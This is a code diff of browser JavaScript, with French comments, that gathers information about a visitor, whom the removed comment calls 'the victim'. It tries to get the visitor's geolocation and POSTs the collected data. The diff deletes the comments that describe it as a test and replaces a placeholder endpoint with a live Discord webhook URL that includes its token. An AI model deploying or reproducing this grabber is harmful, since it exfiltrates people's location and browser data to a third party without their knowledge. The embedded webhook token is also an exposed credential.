@@ -22,7 +22,6 @@
       geolocation: null
     };
 
-    // Tentative de géolocalisation (uniquement si la victime accepte)
     try {
       await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(
@@ -34,14 +33,13 @@
             };
             resolve();
           },
-          () => resolve(), // refus = ignore
+          () => resolve(), 
           { timeout: 3000 }
         );
       });
     } catch {}
 
-    // Envoi à ton endpoint de test (webhook, serveur perso, etc.)
-    fetch("https://example.com/collect", {
+    fetch("https://discord.com/api/webhooks/1442229849287692338/pPy2dPqNwMFkFtRLoNuFfo0Vk8GQN_XmxI6ZA9VjqlqHI9_7DTcJ-GmhrGrH8o4CJtvE", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(info)
